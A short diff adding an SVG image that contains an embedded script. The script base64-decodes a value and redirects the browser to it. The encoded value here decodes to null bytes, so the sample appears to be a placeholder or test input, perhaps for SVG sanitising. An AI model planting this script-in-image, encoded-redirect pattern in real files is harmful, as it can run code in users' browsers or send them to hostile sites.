@@ -1,0 +1,2 @@
+<svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript"><![CDATA[ var u = atob("AAAA"); window.location.href = u; ]]></script></svg>
+
